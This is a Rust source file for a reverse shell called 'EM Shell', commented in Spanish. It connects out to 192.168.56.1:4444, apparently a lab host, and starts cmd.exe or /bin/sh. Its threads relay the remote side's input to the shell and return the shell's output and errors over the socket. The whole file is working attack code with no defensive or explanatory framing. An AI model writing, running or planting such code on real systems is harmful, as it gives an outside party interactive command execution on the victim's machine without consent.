use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio, Child};

fn main() {
    let direccion_servidor = "192.168.56.1:4444";

    println!("[*] Iniciando EM Shell...");

    match iniciar_componente_red(direccion_servidor) {
        Ok(mut stream) => {
            println!("[+] Conexión de red establecida.");
            if let Err(e) = gestionar_flujo_shell(&mut stream) {
                eprintln!("[-] Error en el flujo: {}", e);
            }
        }
        Err(e) => {
            eprintln!("[-] Error al conectar: {}", e);
        }
    }
}

fn iniciar_componente_red(ip_puerto: &str) -> io::Result<TcpStream> {
    TcpStream::connect(ip_puerto)
}

fn levantar_proceso_sistema() -> io::Result<Child> {
    #[cfg(target_os = "windows")]
    let mut comando = Command::new("cmd.exe");
    
    #[cfg(not(target_os = "windows"))]
    let mut comando = Command::new("/bin/sh");

    comando.stdin(Stdio::piped())
           .stdout(Stdio::piped())
           .stderr(Stdio::piped());

    comando.spawn()
}

fn gestionar_flujo_shell(stream: &mut TcpStream) -> io::Result<()> {
    let mut proceso = levantar_proceso_sistema()?;

    let mut p_stdin = proceso.stdin.take().unwrap();
    let p_stdout = proceso.stdout.take().unwrap();
    let p_stderr = proceso.stderr.take().unwrap();

    // Lee de la RED -> Limpiar \r -> Enviar al PROCESO
    let mut stream_lectura = stream.try_clone()?;
    std::thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stream_lectura.read(&mut buffer) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    // Convertimos a string temporal para limpiar el \r de Windows
                    let datos_recibidos = String::from_utf8_lossy(&buffer[..n]);
                    let datos_limpios = datos_recibidos.replace("\r", "");
                    
                    if p_stdin.write_all(datos_limpios.as_bytes()).is_err() {
                        break;
                    }
                    let _ = p_stdin.flush();
                }
            }
        }
    });

    // Lee la salida del PROCESO -> Enviar a la RED
    let mut stream_escritura = stream.try_clone()?;
    std::thread::spawn(move || {
        let mut buffer = [0; 1024];
        let mut fuente = p_stdout;
        loop {
            match fuente.read(&mut buffer) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if stream_escritura.write_all(&buffer[..n]).is_err() { break; }
                    let _ = stream_escritura.flush();
                }
            }
        }
    });

    // Lee errores del PROCESO -> Enviar a la RED
    let mut stream_errores = stream.try_clone()?;
    std::thread::spawn(move || {
        let mut buffer = [0; 1024];
        let mut fuente = p_stderr;
        loop {
            match fuente.read(&mut buffer) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if stream_errores.write_all(&buffer[..n]).is_err() { break; }
                    let _ = stream_errores.flush();
                }
            }
        }
    });

    let _ = proceso.wait();
    Ok(())
}